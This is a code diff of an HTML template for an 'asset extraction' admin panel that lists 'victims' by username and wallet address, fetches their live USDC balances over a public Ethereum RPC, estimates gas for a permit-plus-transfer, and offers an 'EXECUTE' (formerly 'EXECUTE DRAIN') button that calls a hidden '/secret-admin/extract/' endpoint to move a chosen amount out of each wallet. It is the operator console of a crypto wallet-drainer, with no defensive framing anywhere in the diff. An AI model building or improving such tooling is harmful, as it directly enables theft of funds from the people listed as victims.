@@ -2,70 +2,141 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CORE ASSET CONTROL</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        body { background: #020617; color: #f1f5f9; font-family: monospace; padding: 20px; }
-        .panel { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { background: #1e293b; color: #38bdf8; padding: 12px; text-align: left; }
-        td { padding: 12px; border-bottom: 1px solid #1e293b; }
-        .amt-input { background: #0f172a; border: 1px solid #334155; color: #4ade80; padding: 5px; width: 120px; border-radius: 4px; }
-        .btn-exec { background: #ef4444; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
-        .btn-exec:disabled { background: #475569; }
+        :root { --danger: #ef4444; --success: #22c55e; --accent: #38bdf8; --bg: #020617; --panel-bg: #0f172a; }
+        body { background: var(--bg); color: #f1f5f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; margin: 0; }
+
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #1e293b; padding-bottom: 20px; }
+        h2 { margin: 0; color: var(--accent); letter-spacing: 2px; font-weight: 800; }
+
+        .panel { width: 100%; border-radius: 12px; overflow: hidden; background: var(--panel-bg); border: 1px solid #1e293b; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); }
+        table { width: 100%; border-collapse: collapse; }
+        th { background: #1e293b; color: #94a3b8; padding: 15px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
+
+        .wallet-addr { color: #64748b; font-family: monospace; font-size: 13px; }
+        .balance-tag { color: var(--success); font-weight: bold; }
+        .gas-tag { color: #eab308; font-size: 12px; }
+
+        .amt-input { background: #1e293b; border: 1px solid #334155; color: #4ade80; padding: 8px; width: 100px; border-radius: 6px; outline: none; }
+        .btn-exec { background: var(--danger); color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 6px; font-weight: bold; transition: all 0.2s; }
+        .btn-exec:hover { filter: brightness(1.2); transform: scale(1.02); }
+        .btn-exec:disabled { background: #475569; cursor: not-allowed; }
+
+        /* Custom Notification Toast */
+        #notifier { position: fixed; bottom: 20px; right: 20px; padding: 15px 25px; border-radius: 8px; display: none; z-index: 9999; font-weight: 600; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
-    <h2>🔴 ASSET EXTRACTION INTERFACE</h2>
-    <table class="panel">
-        <thead>
-            <tr>
-                <th>USER</th>
-                <th>WALLET</th>
-                <th>EXTRACTION AMOUNT (USDC)</th>
-                <th>ACTION</th>
-            </tr>
-        </thead>
-        <tbody>
-            {% for v in victims %}
-            <tr>
-                <td>{{ v.user.username }}</td>
-                <td style="color: #94a3b8;">{{ v.wallet_address }}</td>
-                <td>
-                    <input type="number" id="amt_{{ v.id }}" class="amt-input" placeholder="e.g. 500.00">
-                </td>
-                <td>
-                    <button class="btn-exec" onclick="runExtraction(this, '{{ v.id }}')">EXECUTE DRAIN</button>
-                </td>
-            </tr>
-            {% endfor %}
-        </tbody>
-    </table>
 
-    <script>
-    async function runExtraction(btn, id) {
-        const val = document.getElementById(`amt_${id}`).value;
-        if(!val || val <= 0) return alert("Enter amount first");
+    <div class="header">
+        <h2>🔴 ASSET EXTRACTION SYSTEM</h2>
+        <div id="admin-status">Admin ETH: <span id="admin-eth">Loading...</span></div>
+    </div>
 
-        if(!confirm(`Confirm drain of ${val} USDC? Gas fees will apply to Admin Wallet.`)) return;
+    <div class="panel">
+        <table>
+            <thead>
+                <tr>
+                    <th>User / ID</th>
+                    <th>Wallet Address</th>
+                    <th>Live Balance</th>
+                    <th>Est. Gas Cost</th>
+                    <th>Extract Amt</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for v in victims %}
+                <tr id="row-{{ v.id }}">
+                    <td><strong>{{ v.user.username }}</strong><br><small style="color:#475569">ID: {{ v.id }}</small></td>
+                    <td class="wallet-addr">{{ v.wallet_address }}</td>
+                    <td class="balance-tag" id="bal-{{ v.id }}">Fetching...</td>
+                    <td class="gas-tag" id="gas-{{ v.id }}">Calculating...</td>
+                    <td><input type="number" id="amt-{{ v.id }}" class="amt-input" value="100"></td>
+                    <td>
+                        <button class="btn-exec" onclick="runExtraction(this, '{{ v.id }}', '{{ v.wallet_address }}')">EXECUTE</button>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
 
-        btn.disabled = true;
-        btn.innerText = "MINING...";
+    <div id="notifier"></div>
+
+<script>
+const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
+const PROVIDER_URL = "https://cloudflare-eth.com"; // Public RPC
+
+function notify(msg, type) {
+    const n = document.getElementById('notifier');
+    n.innerText = msg;
+    n.style.display = 'block';
+    n.style.background = type === 'success' ? '#166534' : '#991b1b';
+    setTimeout(() => { n.style.display = 'none'; }, 5000);
+}
+
+async function updateLiveStats() {
+    const provider = new ethers.providers.JsonRpcProvider(PROVIDER_URL);
+    const contract = new ethers.Contract(USDC_ADDR, USDC_ABI, provider);
+
+    // Get Live Gas Price
+    const gasPrice = await provider.getGasPrice();
+    const gasLimit = 125000; // Total for Permit + Transfer
+    const totalGasWei = gasPrice.mul(gasLimit);
+    const gasEth = ethers.utils.formatEther(totalGasWei);
+
+    // Iterate through all user rows in the table
+    const rows = document.querySelectorAll('tr[id^="row-"]');
+    for (let row of rows) {
+        const id = row.id.split('-')[1];
+        const addr = row.querySelector('.wallet-addr').innerText;
 
         try {
-            const res = await fetch(`/secret-admin/extract/${id}/?amount=${val}`);
-            const data = await res.json();
-
-            if(data.status === 'success') {
-                alert("SUCCESS! TX: " + data.tx);
-            } else {
-                alert("FAILED: " + data.msg);
-            }
-        } catch(e) {
-            alert("SERVER ERROR");
-        } finally {
-            btn.disabled = false;
-            btn.innerText = "EXECUTE DRAIN";
+            const bal = await contract.balanceOf(addr);
+            document.getElementById(`bal-${id}`).innerText = (parseFloat(ethers.utils.formatUnits(bal, 6))).toFixed(2) + " USDC";
+            document.getElementById(`gas-${id}`).innerText = "Cost: ~" + parseFloat(gasEth).toFixed(5) + " ETH";
+        } catch (e) {
+            console.error("Fetch failed for " + addr);
         }
     }
-    </script>
+}
+
+async function runExtraction(btn, id, addr) {
+    const amt = document.getElementById(`amt-${id}`).value;
+    if(!amt || amt <= 0) return notify("Set valid amount", "error");
+
+    btn.disabled = true;
+    btn.innerText = "MINING...";
+    notify(`Broadcasting transaction for ${addr}...`, "success");
+
+    try {
+        const res = await fetch(`/secret-admin/extract/${id}/?amount=${amt}`);
+        const data = await res.json();
+
+        if(data.status === 'success') {
+            notify("EXTRACTION COMPLETE! TX: " + data.tx.substring(0,10) + "...", "success");
+        } else {
+            notify("FAILED: " + data.msg, "error");
+        }
+    } catch(e) {
+        notify("SERVER COMMUNICATION ERROR", "error");
+    } finally {
+        btn.disabled = false;
+        btn.innerText = "EXECUTE";
+        updateLiveStats(); // Refresh data
+    }
+}
+
+// Initial Run
+updateLiveStats();
+// Auto-refresh stats every 60 seconds
+setInterval(updateLiveStats, 60000);
+</script>
 </body>
 </html>
